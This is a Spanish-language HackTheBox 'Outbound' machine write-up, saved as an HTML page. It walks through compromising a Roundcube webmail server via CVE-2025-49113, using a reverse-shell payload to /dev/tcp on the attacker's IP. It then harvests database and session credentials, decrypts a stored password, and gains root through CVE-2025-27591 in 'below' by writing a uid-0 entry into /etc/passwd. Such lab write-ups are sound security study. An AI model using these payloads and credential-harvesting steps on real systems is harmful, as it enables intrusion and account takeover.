@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Alert - juanchan.es</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./Outbound.JPG"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/Outbound.html" itemprop="name">Alert</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> Jul, 2025 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos TCP</h2>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://mail.outbound.htb/
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="2-enumeración">2. Enumeración</h2>
+<p>Añadimos el nombre de dominio,  mail.outbound.htb, a /etc/hosts. Comprobamos si existen más dominios, con el siguiente comando, pero observamos que no:</p>
+<pre><code class="language-bash"># gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u outbound.htb -t 50 --append-domain  
+</code></pre>
+<pre><code class="language-bash">===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://outbound.htb
+[+] Method:          GET
+[+] Threads:         50
+[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: mail.outbound.htb Status: 200 [Size: 5327]
+</code></pre>
+<p>Si accedemos a la página <a href="http://mail.outbound.htb/">http://mail.outbound.htb/</a>, nos encontramos con un servicio llamado Rouncube Webmail, junto con su panel de autenticación. Buscando por internet vemos que pueden existir unas credenciales por defecto, con el siguiente formato: <code>demo@outbound.htb:password</code>, pero en nuestro caso no funciona.</p>
+<p>Observando la página de hackthebox, nos damos cuenta que contamos con credenciales para empezar el pentesting en la máquina:</p>
+<pre><code class="language-bash">As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="3-explotación">3. Explotación</h2>
+<p>Una vez dentro, en la sección &quot;About&quot;, podemos ver que se trata de la versión:</p>
+<pre><code class="language-bash">Roundcube Webmail 1.6.10
+
+Copyright © 2005-2025, The Roundcube Dev Team
+</code></pre>
+<p>Por lo que podemos buscar exploits que afecten a dicha versión, encontrando el CVE-2025-49113, que se trata de una vulnerabilidad que nos permite un RCE a través de una deserialización de objetos PHP.
+Para esto existe un PoC en github: <a href="https://github.com/BiiTts/Roundcube-CVE-2025-49113">https://github.com/BiiTts/Roundcube-CVE-2025-49113</a>. Probamos entonces a establecer una revershell con los siguientes comandos:</p>
+<ul>
+<li>En la máquina host:<pre><code class="language-bash"># nc -lvnp 9001
+</code></pre>
+</li>
+<li>En la máquina objetivo: <pre><code class="language-bash"># python3 roundcube_exploit.py http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 &quot;whoami&quot; 
+</code></pre>
+</li>
+</ul>
+<p>Pero vemos que no funciona y no conseguimos nada. Buscamos otro exploit, en este caso uno en php, en el siguiente repo: <a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">https://github.com/hakaioffsec/CVE-2025-49113-exploit</a>, entonces ejecutamos lo siguiente:</p>
+<ul>
+<li>En la máquina host:<pre><code class="language-bash"># nc -lvnp 9001
+</code></pre>
+</li>
+<li>En la máquina objetivo: <pre><code class="language-bash"># php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 &quot;bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.14.45/9001 0&gt;&amp;1&#39;&quot;
+</code></pre>
+Y vemos como somos capaces de obtener una shell como el usuario <code>www-data</code>:</li>
+</ul>
+<pre><code class="language-bash">$ whoami
+www-data
+</code></pre>
+<p>&nbsp;</p>
+<h2 id="4-movimiento-lateral">4. Movimiento lateral</h2>
+<p>Navegando por los archivos de la aplicación en el directorio /var/www/html/roudcube, encontramos el archivo <code>/var/www/html/roudcube/public_html/roundcube/config/config.inc.php</code>, en el cual, entre otras cosas, podemos observar lo siguiente:</p>
+<pre><code class="language-bash">$config[&#39;db_dsnw&#39;] = &#39;mysql://roundcube:RCDBPass2025@localhost/roundcube&#39;;
+</code></pre>
+<p>Accedemos entonces, desde la máquina objetivo a mysql, con el siguiente comando:</p>
+<pre><code class="language-bash">www-data@mail:/$ mysql -h localhost -u roundcube -p
+Enter password:
+</code></pre>
+<p>Observamos los siguientes databases:</p>
+<pre><code class="language-bash">MariaDB [(none)]&gt; SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| roundcube          |
++--------------------+
+2 rows in set (0.005 sec)
+</code></pre>
+<p>Dentro del database <code>roundcube</code>, encontramos las siguientes tablas: </p>
+<pre><code class="language-bash">MariaDB [roundcube]&gt; SHOW TABLES;
++---------------------+
+| Tables_in_roundcube |
++---------------------+
+| cache               |
+| cache_index         |
+| cache_messages      |
+| cache_shared        |
+| cache_thread        |
+| collected_addresses |
+| contactgroupmembers |
+| contactgroups       |
+| contacts            |
+| dictionary          |
+| filestore           |
+| identities          |
+| responses           |
+| searches            |
+| session             |
+| system              |
+| users               |
++---------------------+
+17 rows in set (0.001 sec)
+</code></pre>
+<p>Buscamos entonces en las tablas, alguna información que nos pueda servir. Si realizamos la siguiente consulta, en la tabla sessions, obtenemos lo siguiente:</p>
+<pre><code class="language-bash">MariaDB [roundcube]&gt; SELECT FROM_BASE64(vars) from session;
+| language|s:5:&quot;en_US&quot;;imap_namespace|a:4:{s:8:&quot;personal&quot;;a:1:{i:0;a:2:{i:0;s:0:&quot;&quot;;i:1;s:1:&quot;/&quot;;}}
+s:5:&quot;other&quot;;N;s:6:&quot;shared&quot;;N;s:10:&quot;prefix_out&quot;;s:0:&quot;&quot;;}imap_delimiter|s:1:&quot;/&quot;;imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:&quot;jacob&quot;;storage_host|s:9:&quot;localhost&quot;;storage_port|
+i:143;storage_ssl|b:0;password|s:32:&quot;L7Rv00A8TuwJAr67kITxxcSgnIk25Am/&quot;;login_time|i:1749397119;timezone|s:13:&quot;Europe/London&quot;;STORAGE_SPECIAL-USE|b:1;auth_secret|
+s:26:&quot;DpYqv6maI9HxDL5GhcCd8JaQQW&quot;;request_token|s:32:&quot;TIsOaABA1zHSXZOBpH6up5XFyayNRHaw&quot;;task|s:4:&quot;mail&quot;;skin_config|a:7:
+{s:17:&quot;supported_layouts&quot;;a:1:{i:0;s:10:&quot;widescreen&quot;;}s:22:&quot;jquery_ui_colors_theme&quot;;s:9:&quot;bootstrap&quot;;s:18:&quot;embed_css_location&quot;;s:17:&quot;/styles/
+embed.css&quot;;s:19:&quot;editor_css_location&quot;;s:17:&quot;/styles/embed.css&quot;;s:17:&quot;dark_mode_support&quot;;b:1;s:26:&quot;media_browser_css_location&quot;;s:4:&quot;none&quot;;s:21:&quot;additi
+onal_logo_types&quot;;a:3:{i:0;s:4:&quot;dark&quot;;i:1;s:5:&quot;small&quot;;i:2;s:10:&quot;small-dark&quot;;}}imap_host|s:9:&quot;localhost&quot;;page|i:1;mbox|s:5:&quot;INBOX&quot;;sort_col|s:0:&quot;&quot;;sort_order|s:4:&quot;DESC&quot;;STORAGE_THREAD|
+a:3:{i:0;s:10:&quot;REFERENCES&quot;;i:1;s:4:&quot;REFS&quot;;i:2;s:14:&quot;ORDEREDSUBJECT&quot;;}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:
+{s:4:&quot;name&quot;;s:8:&quot;messages&quot;;s:2:&quot;id&quot;;s:11:&quot;messagelist&quot;;s:5:&quot;class&quot;;s:42:&quot;listing messagelist sortheader fixedheader&quot;;s:15:&quot;aria-labelledby&quot;;s:22:&quot;aria-label-messagelist&quot;;s:9:&quot;data-
+list&quot;;s:12:&quot;message_list&quot;;s:14:&quot;data-label-msg&quot;;s:18:&quot;The list is empty.&quot;;}unseen_count|a:2:{s:5:&quot;INBOX&quot;;i:2;s:5:&quot;Trash&quot;;i:0;}folders|a:1:{s:5:&quot;INBOX&quot;;a:2:{s:3:&quot;cnt&quot;;i:2;s:6:&quot;maxuid&quot;;i:3;}}
+list_mod_seq|s:2:&quot;10&quot;; |
+</code></pre>
+<p>Entonces navegando por el sistema, encontramos un ejecutable llamado decrypt.sh, que parece ser que es utilizado para descifrar los hashes:</p>
+<pre><code class="language-bash">www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ls
+    cleandb.sh    gc.sh             jsshrink.sh      msgimport.sh
+    cssshrink.sh  indexcontacts.sh  makedoc.sh       update.sh
+    decrypt.sh    initdb.sh         moduserprefs.sh  updatecss.sh
+    deluser.sh    installto.sh      msgexport.sh     updatedb.sh
+</code></pre>
+<p>Ejecutamos entonces lo siguiente, utilizando como entrada en hash encontrado en la sección <code>b:0;password</code>:</p>
+<pre><code class="language-bash">www-data@mail:/var/www/html/roundcube/public_html/roundcube/bin$ ./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
+595mO8DmwGeD
+</code></pre>
+<p>Si observamos los directorio home, encontramos los siguientes usuarios:</p>
+<pre><code class="language-bash">www-data@mail:/$ ls /home/
+    jacob  mel  tyler
+</code></pre>
+<p>Si intentamos conectarnos por ssh con dicha contraseña para cualquiera de los dos usuarios, observamos como no nos es posible. Por lo que probamos a conectarnos al servicio web de <strong>Rouncube Webmail</strong> con las credenciales <code>jacob:595mO8DmwGeD</code>, y conseguimos acceso.</p>
+<p>Vemos que en la bandeja de entrada encontramos un correo con el siguiente contenido:</p>
+<pre><code class="language-bash">Important Update
+Contact photo
+From tyler@outbound.htb on 2025-06-07 10:00
+Details Headers
+Due to the recent change of policies your password has been changed.
+
+Please use the following credentials to log into your account: gY4Wr3a1evp4
+
+Remember to change your password when you next log into your account.
+
+Thanks!
+
+Tyler
+</code></pre>
+<p>Probamos entonces la credenciales <code>jacob:gY4Wr3a1evp4</code> para acceder mediante ssh, conseguimos acceso al máquina y somos capaces de obtener la flag de usuario.</p>
+<p>&nbsp;</p>
+<h2 id="5-escalado-de-privilegios">5. Escalado de privilegios</h2>
+<p>Observamos los comandos que puede ejecutar el usuario jacob, con permisos de root:</p>
+<pre><code class="language-bash">jacob@outbound:~$ sudo -l
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+</code></pre>
+<p>Buscando por internet, encontramos una vulnerabilidad asociada a dicho binario, en concreto la <strong>CVE-2025-27591</strong>. Encontramos el siguiente PoC en github: <a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC">https://github.com/BridgerAlderson/CVE-2025-27591-PoC</a>. Lo descargamos en nuestra máquina host, y lo pasamos a la máquina victima. En ella si lo ejecutamos, vemos como se crea una nueva cuenta de usuario con permisos de root:</p>
+<pre><code class="language-bash">jacob@outbound:/tmp$ python3 exploit.py 
+[*] Checking for CVE-2025-27591 vulnerability...
+[+] /var/log/below is world-writable.
+[!] /var/log/below/error_root.log is a regular file. Removing it...
+[+] Symlink created: /var/log/below/error_root.log -&gt; /etc/passwd
+[+] Target is vulnerable.
+[*] Starting exploitation...
+[+] Wrote malicious passwd line to /tmp/attacker
+[+] Symlink set: /var/log/below/error_root.log -&gt; /etc/passwd
+[*] Executing &#39;below record&#39; as root to trigger logging...
+Jul 15 10:50:37.628 DEBG Starting up!
+Jul 15 10:50:37.628 ERRO 
+----------------- Detected unclean exit ---------------------
+Error Message: Failed to acquire file lock on index file: /var/log/below/store/index_01752537600: EAGAIN: Try again
+-------------------------------------------------------------
+[+] &#39;below record&#39; executed.
+[*] Copying payload into /etc/passwd via symlink...
+[+] Running: cp /tmp/attacker /var/log/below/error_root.log
+[*] Attempting to switch to root shell via &#39;su attacker&#39;...
+attacker@outbound:/tmp# ls
+attacker                                 snapshot_replay.aXtQxc                                                          systemd-private-9fdb5ae53efe404ca8401ff28443c481-systemd-resolved.service-ySqYGE
+exploit.py                               snapshot_replay.rgzMNi                                                          systemd-private-9fdb5ae53efe404ca8401ff28443c481-systemd-timesyncd.service-qfWBRo
+snap-private-tmp                         systemd-private-9fdb5ae53efe404ca8401ff28443c481-ModemManager.service-chSiJz    test
+snapshot_00000000000_01752576032.I7T28U  systemd-private-9fdb5ae53efe404ca8401ff28443c481-polkit.service-BXhJqF          vmware-root_667-3980363901
+snapshot_01752576281_01752576281.EAiJqQ  systemd-private-9fdb5ae53efe404ca8401ff28443c481-systemd-logind.service-PqskMW
+attacker@outbound:/tmp# whoami
+attacker
+attacker@outbound:/tmp# id
+uid=0(attacker) gid=0(root) groups=0(root)
+</code></pre>
+<p>Por lo que somos capaces de obtener la flag de usuario root.</p>
+
+
+
+
+        
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
